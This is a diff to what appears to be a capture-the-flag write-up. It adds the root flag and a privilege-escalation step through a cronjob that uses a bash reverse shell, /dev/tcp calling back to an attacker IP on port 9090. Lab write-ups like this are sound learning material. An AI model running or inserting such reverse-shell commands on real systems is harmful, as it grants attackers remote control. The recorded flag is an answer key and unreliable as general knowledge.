@@ -161,7 +161,7 @@ Google it again and found this (https://www.dcode.fr/rot-cipher?source=post_page
 
 ---
 ## Q11: What is the root flag?
-### A: 
+### A: flag{63a9f0ea7bb98050796b649e85481845}
 
 To privesc as per the machine description we need to go for a cronjob
 
@@ -173,5 +173,13 @@ It seems like there a file that we can use
 
 Seems pretty straight forward
 
-Use a reverse shell
+Use a reverse shell `bash -i >& /dev/tcp/192.168.208.47/9090 0>&1`
 
+![](../Img/Pasted%20image%2020260318124741.png)
+
+Search for the flag
+
+![](../Img/Pasted%20image%2020260318124840.png)
+
+
+Tags: 
